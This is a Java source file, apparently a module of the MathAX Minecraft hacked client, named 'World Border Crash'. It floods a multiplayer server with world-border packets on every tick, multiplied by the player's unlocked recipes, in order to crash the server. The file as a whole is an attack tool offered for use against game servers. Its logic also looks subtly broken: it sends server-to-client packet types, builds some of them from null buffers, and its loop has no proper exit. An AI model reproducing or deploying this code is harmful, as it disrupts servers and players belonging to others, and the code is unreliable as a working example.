package mathax.client.systems.modules.crash;

import mathax.client.eventbus.EventHandler;
import mathax.client.events.game.GameLeftEvent;
import mathax.client.events.world.TickEvent;
import mathax.client.settings.BoolSetting;
import mathax.client.settings.IntSetting;
import mathax.client.settings.Setting;
import mathax.client.settings.SettingGroup;
import mathax.client.systems.modules.Categories;
import mathax.client.systems.modules.Module;
import net.minecraft.client.gui.screen.recipebook.RecipeResultCollection;
import net.minecraft.item.Items;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.s2c.play.*;
import net.minecraft.recipe.Recipe;
import net.minecraft.screen.CraftingScreenHandler;
import net.minecraft.world.border.WorldBorder;

import java.util.List;
import java.util.Objects;

public class WorldBorderCrash extends Module {

    private final Setting<Integer> packets;

    private final Setting<Boolean> autoDisable;


    public WorldBorderCrash() {
        super(Categories.Crash, Items.GLASS_PANE, "World Border Crash", "CRYSTAL || A module that will take advantage of the World Border packets.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        packets = sgGeneral.add(new IntSetting.Builder()
            .name("packets")
            .description("How many packets to send per tick. Warning: this is multiplied by the amount of unlocked recipes")
            .defaultValue(24)
            .min(1)
            .sliderMax(50)
            .build());

        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
        );
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if(!mc.isInSingleplayer()) {
            if (mc.player != null)
                if (mc.getNetworkHandler() == null) {
                    return;
                } else if (!(mc.player.currentScreenHandler instanceof CraftingScreenHandler)) {
                    return;
                }
            try {
                List<RecipeResultCollection> recipeResultCollectionList = null;
                if (mc.player == null) {
                } else {
                    recipeResultCollectionList = mc.player.getRecipeBook().getOrderedResults();
                }
                int j = 0;
                while (true) {
                    if ((recipeResultCollectionList == null) || (j >= recipeResultCollectionList.size())) {
                        error("The required lists are null, toggling.");
                        toggle();
                    } else {
                        RecipeResultCollection recipeResultCollection = recipeResultCollectionList.get(j);
                        List<Recipe<?>> recipes = recipeResultCollection.getRecipes(true);
                        int k = 0;
                        while (true) {
                            if (k < recipes.size()) {
                                Recipe<?> recipe = recipes.get(k);
                                int bound = packets.get();
                                int i = 0;
                                while (true) {
                                    if (i < bound) {
                                        Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new WorldBorderInitializeS2CPacket((PacketByteBuf) null));
                                        mc.getNetworkHandler().sendPacket(new WorldBorderCenterChangedS2CPacket(new WorldBorder()));
                                        mc.getNetworkHandler().sendPacket(new WorldBorderInterpolateSizeS2CPacket(new WorldBorder()));
                                        mc.getNetworkHandler().sendPacket(new WorldBorderWarningTimeChangedS2CPacket((PacketByteBuf) null));
                                        mc.getNetworkHandler().sendPacket(new WorldBorderWarningBlocksChangedS2CPacket(new WorldBorder()));
                                        i++;
                                    } else {
                                        break;
                                    }
                                }
                                k++;
                            } else {
                                break;
                            }
                        }
                        j++;
                    }
                }

            } catch (Exception ignored) {
                error("Stopping crash because an error occurred!");
                toggle();
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }
}
